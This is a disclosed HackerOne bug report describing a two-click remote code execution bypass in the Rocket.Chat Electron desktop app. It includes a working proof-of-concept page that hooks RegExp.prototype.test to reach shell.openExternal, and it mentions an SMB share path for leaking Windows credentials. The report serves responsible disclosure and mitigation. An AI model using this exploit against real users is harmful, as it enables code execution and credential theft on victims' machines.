# Desktop app RCE (#276031 bypass)

## Report Details
- **Report ID**: 843171
- **URL**: https://hackerone.com/reports/843171
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-08T11:45:02.662Z
- **Disclosed**: 2020-11-05T07:21:27.861Z

## Reporter
- **Username**: ivarsvids
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Summary:** #276031 fix bypass, two click remote code execution.

**Description:** The security issue is in links preload file https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/preload/links.js file.
By rewriting  `RegExp.prototype.test` method it is possible to prepare proper answers to get to the `shell.openExternal` method. To trigger  events attached by `addEventListener` you can use `dispatchEvent` method.

Note: for demo I pointed to `calc.exe`, it also cloud be pointed, to SMB share (example. `\\server\share\executable.exe`), which can lead to windows credential leak and attacker also can execute arbitrary code on victims machine.

i believe this issue is cross-platform, an can be exploited in Linux, MacOS with minor JavaScript modifications.

## Releases Affected:

  * Rocket.Chat.Electron 2.17.9 

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create web page with following `index.html`
```
<html>
	<head>
	</head>
	<body style="background-color: white;" >
		<h1>Initializing surprise in 3, 2, 1</h1>
		<script>
			setTimeout(() => {
				// create link
				let a = document.createElement('A');
				a.setAttribute('href', 'c:\\windows\\system32\\calc.exe');

				// hooks regexp.test
				RegExp.prototype._test = RegExp.prototype._test || RegExp.prototype.test;
				RegExp.prototype.test = function(...args){
					return this.source === '^([a-z]+:)?\\/\\/' || this._test(...args);
				}
				
				// add missing method
				document.closest = () => a;

				// triger event
				document.dispatchEvent(new Event('click'));

				//cleanup
				RegExp.prototype.test = RegExp.prototype._test;
				delete RegExp.prototype._test;
			}, 100);
		</script>
	</body>
</html>
```
  2. create `api/info` which contains JSON, can be empty JSON.
  3. Add new server

## Supporting Material/References:

{F779066}

## Suggested mitigation

I understand that deep-links and `Add new server` are a features and not bugs
* The simplest fix would be to check `isTrusted` attribute for events, but I'm 100% certain that it can be bypassed.
* Enable context isolation (https://github.com/electron/electron/blob/master/docs/tutorial/security.md#3-enable-context-isolation-for-remote-content)

## Impact

An attacker can trick victim to click on deep-link or add self hosted server to desktop application, which leads to remote code execution. I understand that deep-links and/or self hosted servers are not a bug, but it can be used in attack vector.

## Attachments
- rocket_rce.gif
